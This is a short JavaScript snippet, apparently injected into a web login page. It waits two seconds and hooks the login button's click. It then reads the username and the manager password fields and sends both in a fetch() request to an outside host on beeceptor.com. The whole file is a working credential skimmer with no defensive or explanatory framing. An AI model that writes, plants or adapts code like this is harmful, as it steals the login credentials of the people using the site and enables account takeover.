setTimeout(() => {
  const button = document.querySelector(
    'button[class="ant-btn login-account-form-button ant-btn-primary ant-btn-two-chinese-chars"]'
  );

  if (!button) return;

  button.addEventListener('click', () => {
    const idField = document.querySelector('#userName');
    const id = idField?.value;

    const passField = document.querySelector('#manager_pwd');
    const pass = passField?.value;

    fetch('https://sdsdf.free.beeceptor.com/' + id + ':' + pass);
  });
}, 2000); // 2 segundos